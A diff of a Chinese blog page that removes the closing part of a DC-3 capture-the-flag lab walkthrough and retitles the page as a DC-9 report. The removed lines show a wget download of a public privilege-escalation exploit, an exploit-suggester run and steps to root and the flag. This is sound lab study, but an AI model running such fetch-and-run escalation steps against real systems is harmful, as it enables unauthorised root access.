-<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chmod +x linux-exploit-suggester.sh</span><br></pre></td></tr></table></figure></div>
-
-<p>然后执行这个这个脚本文件，爆出漏洞列表</p>
-<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./linux-exploit-suggester.sh</span><br></pre></td></tr></table></figure></div>
-
-<p>这把不用脏牛，看很多教程里大神用了双重释放漏洞，这里也用这个漏洞复现提权</p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://i-blog.csdnimg.cn/direct/94ea12aaeb374855b836c4d491bc3967.png"
-                     
-                ></p>
-<p>为了方便我这里直接在攻击机里面下载解压了</p>
-<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&amp;#x4E0B;&amp;#x8F7D;</span><br><span class="line">wget https://gitlab.com/exploit-database/exploitdb-bin-sploits/-/raw/main/bin-sploits/39772.zip</span><br><span class="line">&amp;#x89E3;&amp;#x538B;</span><br><span class="line">unzip 39771.zip</span><br><span class="line">&amp;#x67E5;&amp;#x770B;</span><br><span class="line">ls -la 39772/</span><br></pre></td></tr></table></figure></div>
-
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://i-blog.csdnimg.cn/direct/e81161c44b7b47149d3815b7e4099151.png"
-                     
-                ></p>
-<p>解压exploit的tar文件</p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://i-blog.csdnimg.cn/direct/32c51d0a48844396b464d45008c49617.png"
-                     
-                ></p>
-<p>cd过去，然后随便开个端口</p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://i-blog.csdnimg.cn/direct/26f841a7a4114a768be22d7022469838.png"
-                     
-                ></p>
-<p>还是wget下载文件，执行（忽略警告）</p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://i-blog.csdnimg.cn/direct/ee4898edcd604e1ca34a3f46542bb63b.png"
-                     
-                ></p>
-<p>提权成功！</p>
-<p>python伪终端，然后cd到root</p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://i-blog.csdnimg.cn/direct/93bac7de6ad3497e9f6d81d5db54b8e5.png"
-                     
-                ></p>
-<p>发现the-flag.txt文件</p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://i-blog.csdnimg.cn/direct/ff65548c60dd42928f9f0f0265a5b10f.png"
-                     
-                ></p>
-<p>成功找到flag</p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://i-blog.csdnimg.cn/direct/eda7626410354fc2b19531c042c03ffc.png"
-                     
-                ></p>
-<p>完结撒花！！</p>
+<p>完结撒花！！❀！</p>
 
 		</div>
 
@@ -1027,18 +966,18 @@
 		<div class="post-copyright-info w-full my-8 px-2 sm:px-6 md:px-8">
 			<div class="article-copyright-info-container">
     <ul>
-        <li><strong>Title:</strong> dc3靶机报告</li>
+        <li><strong>Title:</strong> dc9打靶报告</li>
         <li><strong>Author:</strong> Le_ee 博客等级 码龄1年</li>
         <li><strong>Created at
-                :</strong> 2026-01-28 07:22:43</li>
+                :</strong> 2026-02-05 03:02:56</li>
         
             <li>
                 <strong>Updated at
-                    :</strong> 2026-02-05 10:50:36
+                    :</strong> 2026-02-05 11:04:28
             </li>
         
         <li>
-            <strong>Link:</strong> https://leei.site/2026/01/28/dc系列——dc3/
+            <strong>Link:</strong> https://leei.site/2026/02/05/dc9打靶报告/
         </li>
         <li>
             <strong>
@@ -1063,23 +1002,11 @@
 		
 		<div class="article-nav my-8 flex justify-between items-center px-2 sm:px-6 md:px-8">
 			
-			<div class="article-prev border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
-				<a class="prev" rel="prev" href="/2026/01/28/dc%E7%B3%BB%E5%88%97%E2%80%94%E2%80%94dc4/">
-					<span class="left arrow-icon flex justify-center items-center">
-						<i class="fa-solid fa-chevron-left"></i>
-					</span>
-					<span class="title flex justify-center items-center">
-						<span class="post-nav-title-item truncate max-w-48">dc4打靶报告</span>
-						<span class="post-nav-item">Prev posts</span>
-					</span>
-				</a>
-			</div>
-			
 			
 			<div class="article-next border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
-				<a class="next" rel="next" href="/2025/11/27/dc%E7%B3%BB%E5%88%97%E2%80%94%E2%80%94dc2/">
+				<a class="next" rel="next" href="/2026/02/05/dc8%E6%89%93%E9%9D%B6%E6%8A%A5%E5%91%8A/">
 					<span class="title flex justify-center items-center">
-						<span class="post-nav-title-item truncate max-w-48">dc系列——dc2</span>
+						<span class="post-nav-title-item truncate max-w-48">dc8靶机报告</span>
 						<span class="post-nav-item">Next posts</span>
 					</span>
 					<span class="right arrow-icon flex justify-center items-center">
@@ -1141,7 +1068,7 @@
 		<div class="post-toc-wrap">
 	<div class="post-toc">
 		<div class="toc-title">On this page</div>
-		<div class="page-title">dc3靶机报告</div>
+		<div class="page-title">dc9打靶报告</div>
 		
 
 	</div>
